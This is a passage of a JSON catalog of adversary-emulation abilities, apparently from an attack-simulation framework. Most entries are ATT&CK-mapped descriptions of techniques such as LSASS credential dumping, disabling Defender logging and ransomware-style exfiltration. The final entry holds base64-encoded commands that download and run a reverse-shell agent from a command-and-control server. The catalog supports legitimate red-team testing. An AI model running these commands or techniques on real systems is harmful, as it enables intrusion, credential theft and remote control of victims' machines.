        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Leverage Procdump for lsass memory",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "List contents of current directory",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ls",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "List Directory",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ee12056a74be07c381877d47531429b6",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Google Chrome / Opera Bookmarks on Windows with powershell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "abc25aecd2ed0524af31e79add29cc43",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Internet Explorer Bookmarks using the command prompt",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "69bbe2183fa09c00ccaac62d48e214f8",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Mozilla Firefox bookmarks on Windows with command prompt",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f7a0f7d704aa52a764d9d1bee81e65d6",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Open Egress Ports",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b71736aec5f0386d81a9d711a948e86b",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Window Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Process Main Windows - C# .NET",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "fb8568a6da66d194ab39409de52be4ff",
        "technique_id": "T1010",
        "repeatable": false
    },
    {
        "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Windows Firewall Rules",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "71b3d2945679566b9d94d8cb11df4b70",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5f92451000354bf26a40f5c817b5846d",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Uses windows libraries to get FQDN of infected host",
        "buckets": [],
        "additional_info": {
            "cleanup": "[]"
        },
        "privilege": "",
        "technique_name": "host discovery",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": false,
        "access": {},
        "name": "Local FQDN",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "74d1b640-7f1e-4b36-beba-23a8228f39e0",
        "technique_id": "TA0007",
        "repeatable": false
    },
    {
        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cb6e6c7e18aba2207c696368f8edb23a",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2d74c884d1e0b55f41542ef64bc8fe4b",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Indicator Blocking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "be9d436d25abc40a95d31dd28ca7b0cf",
        "technique_id": "T1562.006",
        "repeatable": false
    },
    {
        "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Indicator Blocking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8725359f7529791717634d8fdd8948e6",
        "technique_id": "T1562.006",
        "repeatable": false
    },
    {
        "description": "An adversary modifies group policy settings\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Policy Modification: Group Policy Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Modify Group policy settings -Powershell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5e0427f03faf554046c6a29864087b49",
        "technique_id": "T1484.001",
        "repeatable": false
    },
    {
        "description": "An adversary can modify the group policy settings.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Policy Modification: Group Policy Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Modify Group policy settings -cmd",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e9345933cc8cb67dbc560f3c2066edd0",
        "technique_id": "T1484.001",
        "repeatable": false
    },
    {
        "description": "An adversary tries to modify the windows firewall registry.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Unusual Windows firewall registry modification -Powershell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "986876c6024765475043100f9e080fc8",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "An adversary tries to modify the windows firewall registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Unusual Windows firewall registry modification -cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "47c89ca1bebf31127217a582c1ef8661",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "40480323b4f54b0d1f0b814771ec5776",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "4df316c222125fe7372723c5b3434977",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "LogMeIn Files Detected Test on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "f1b3fca18d7465cd10e5a7477a3bf97d",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Logoff System - Windows",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "17be2b5f2b1dd2d7dd2eb1a63aecdeee",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Logon Scripts",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "a50586369af237825fc9ccd500b80e5d",
        "technique_id": "T1037.001",
        "repeatable": false
    },
    {
        "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbas ie4uinit.exe use as proxy",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6621c3d77cfc40676e5ff46af37ceb4e",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbas replace.exe use to copy UNC file",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "9b34fc9731b75debb71fc7a0101a03ad",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbas replace.exe use to copy file",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "087b39642aeab378db9c474ce07e1b4e",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbin Gpscript logon option",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6c35402f56f69f6eaf8c0cbe36fa1638",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbin Gpscript startup option",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "209d25131d45ef2d76e3bf69d200173f",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbin Jsc.exe compile javascript to dll",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f68c7284a0d5faf3fc9dfa8c67db0586",
        "technique_id": "T1127",
        "repeatable": false
    },
    {
        "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Lolbin Jsc.exe compile javascript to exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c7377e8d72e51f1d71f37f86357540c2",
        "technique_id": "T1127",
        "repeatable": false
    },
    {
        "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MAZE FTP Upload",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "6646e3ecc1d5a25bc1cd7e68fe43763b",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MAZE Propagation Script",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "b944f7b8548f3a3c8036f1b55324f881",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSBuild Bypass Using Inline Tasks (C#)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0fdc205a9f53455b1a14eb367a2d6ab7",
        "technique_id": "T1127.001",
        "repeatable": false
    },
    {
        "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSBuild Bypass Using Inline Tasks (VB)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "40c845837d06a51ff93c3449d6e00648",
        "technique_id": "T1127.001",
        "repeatable": false
    },
    {
        "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Group Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSFT Get-GPO Cmdlet",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "5a1dc4ce41e376e1928d3a399ccadff3",
        "technique_id": "T1615",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSP360 Connect Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "0a4318388a85274588de8a60688c622f",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "XSL Script Processing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSXSL Bypass using local files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "95828bbf041dab6f9743339122c4b7e1",
        "technique_id": "T1220",
        "repeatable": false
    },
    {
        "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "XSL Script Processing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MSXSL Bypass using remote files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b1129d5b6d29f6611c03e4f091d6c42d",
        "technique_id": "T1220",
        "repeatable": false
    },
    {
        "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Makes Eventlog blind with Phant0m",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0962e6107fcfa0f5abe2c5880d31cf34",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Maldoc choice flags command execution",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ab1b50880382b06d48d3d23ad1786239",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Adversaries may rely on a user running a malicious image to facilitate execution",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious Image",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Malicious Execution from Mounted ISO Image",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "b939c81cba750f4b3ef67e6b0456b41e",
        "technique_id": "T1204.003",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Malicious User Agents - CMD",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "af4bcca1e12279e4b6388cefcf40b190",
        "technique_id": "T1071.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Malicious User Agents - Powershell",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "ef2c951840423ba90c208867dcf89c87",
        "technique_id": "T1071.001",
        "repeatable": false
    },
    {
        "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Malicious process Masquerading as LSM.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "18348573c1f989a6cca9e9bf10809700",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Malware Masquerading and Execution from Zip File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b3f30f3fd6b58f412ca7f06c4408b6a1",
        "technique_id": "T1036",
        "repeatable": false
    },
    {
        "description": "A reverse-shell agent which communicates via the TCP contact",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [
                    {
                        "description": "Run against the UDP contact",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    }
                ],
                "payloads": [],
